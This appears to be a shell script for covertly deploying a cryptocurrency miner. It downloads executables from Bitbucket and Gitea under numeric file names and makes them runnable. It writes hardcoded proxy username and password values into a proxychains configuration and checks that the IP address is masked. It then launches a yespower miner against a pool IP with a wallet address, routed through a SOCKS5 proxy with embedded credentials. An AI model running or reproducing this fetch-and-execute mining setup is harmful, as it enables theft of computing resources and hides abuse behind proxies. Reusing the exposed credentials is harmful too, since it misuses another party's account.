proxy="us-east-static-01.quotaguard.com" 
port="9293" 
user="5d1u5nqzx8fm9m"  
pass="dcd4ndgvvxw2knswiggb8wxia41e" 
wget -q -O 20383396 https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x 20383396
wget -q -O 2020999 https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x 2020999 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./2020999 ./20383396 -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-Diez) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://5d1u5nqzx8fm9m:dcd4ndgvvxw2knswiggb8wxia41e@us-east-static-01.quotaguard.com:1080 
